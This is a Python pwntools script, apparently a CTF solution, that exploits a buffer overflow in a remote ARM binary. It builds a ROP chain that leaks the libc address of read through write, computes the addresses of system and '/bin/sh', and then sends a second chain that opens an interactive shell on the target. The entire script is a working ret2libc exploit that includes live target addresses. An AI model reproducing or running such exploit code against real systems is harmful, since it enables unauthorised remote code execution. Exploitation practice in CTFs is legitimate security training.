#!/usr/bin/env python3

from pwn import *

overflow_len = 220

# ~ sock = remote("10.0.0.34", 1337)
sock = remote("178.128.40.63", 32744)

sock.read(1024)

gadget1 = 0x000083cc # pop {r3, pc}

gadget2 = 0x00008628 # pop {r4, r5, r6, r7, r8, sb, sl, pc}

gadget3 = 0x000085f4 # mov r0, sl ; mov r1, r8 ; mov r2, r7 ; blx r3

read_got  = 0x1083c
write_plt = 0x8420
nothing = 0x69420

exploit = b"i" * overflow_len
exploit += p32(gadget1)

## gadget 1 - jump to mov gadget to setup write
exploit += p32(write_plt) # r3
exploit += p32(gadget2) # pc

## gadget 2; setup write args to leak libc addr
exploit += p32(0x8468) # r4 - *main for weird ret after gadget3
exploit += p32(nothing) # r5
exploit += p32(nothing) # r6
exploit += p32(4) # r7 - write len
exploit += p32(read_got) # r8 - write *buf
exploit += p32(nothing) # sb
exploit += p32(1) # sl/r10 - write fd
exploit += p32(gadget3) # pc - run gadget3 to move args in correct registers

input("press enter to send")

sock.write(exploit)

libc_read = u32(sock.recv(4))

### local libc offsets
# ~ libc_system = libc_read - 0x90ed4
# ~ libc_bin_sh = libc_system + 0xfc7b8

libc_system = libc_read - 0x5f640
libc_bin_sh = libc_system + 0xa8a60

## we jumped back to main
exploit = b"i" * overflow_len
exploit += p32(gadget1)

## gadget 1 -
exploit += p32(libc_system) # r3
exploit += p32(gadget2) # pc

## gadget 2; setup system arg
exploit += p32(nothing) # r4
exploit += p32(nothing) # r5
exploit += p32(nothing) # r6
exploit += p32(nothing) # r7
exploit += p32(nothing) # r8
exploit += p32(nothing) # sb
exploit += p32(libc_bin_sh) # sl/r10 - system arg0
exploit += p32(gadget3) # pc

sock.write(exploit)

sock.interactive()
